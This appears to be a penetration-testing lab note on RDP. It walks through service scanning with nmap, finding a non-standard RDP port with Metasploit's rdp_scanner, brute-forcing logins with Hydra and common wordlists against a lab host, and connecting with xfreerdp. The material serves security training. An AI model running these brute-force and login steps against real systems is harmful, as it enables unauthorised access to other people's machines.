- The Remote Desktop Protocol (RDP) is a proprietary GUI remote access protocol and is used to remotely connect and interact with a windows systems.
- RDP uses TCP port ***3389*** by default, and it requires a legitimate user account on the target system as well as the user's password in clear text.

## Practical
##### Scan the Target
```
nmap -sV IP
```

##### Identify RDP endpoints using an auxiliary module
Default RDP port, 3389, is not present but port 3333 is exposed. So, using Metasploit to dig further on that port.
```
msfconsole
search rdp_scanner
use auxiliary/scanner/rdp/rdp_scanner
set rport 3333
set rhosts target
run
```

We found the target RDP port is exposed on the port 3333 not 3389.

##### Brute Force using Hydra
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://demo.ine.local -s 3333
```

##### Connect to RDP
```
xfreerdp /u:administrator /p:password /v:target:port
```
